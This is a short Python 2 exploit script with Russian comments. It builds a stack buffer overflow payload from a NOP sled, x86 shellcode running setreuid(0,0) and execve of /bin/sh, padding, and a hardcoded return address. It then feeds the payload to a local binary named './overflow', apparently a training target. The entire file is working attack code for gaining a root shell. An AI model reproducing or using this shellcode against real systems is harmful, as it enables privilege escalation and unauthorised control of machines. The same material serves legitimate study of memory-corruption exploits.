#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Использование: python exploit.py

import struct
from subprocess import call


def little_endian(num):
	"""Упаковка адреса в формат little endian."""
	return struct.pack('<I', num)


junk     = 'A' * 35                   # мусор из символов "A"
nop_sled = '\x90' * 32                # NOP-срез
ret_addr = little_endian(0xbfffee2c)  # адрес возврата

# setreuid(0,0) + execve("/bin/sh", ["/bin/sh", NULL])
shellcode = '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'

payload  = nop_sled
payload += shellcode
payload += nop_sled
payload += junk
payload += ret_addr

try:
	call(['./overflow', payload])  # выполнится в случае, если был импорт функции call (7-я строка)
except NameError:
	print payload  # выполнится в противном случае
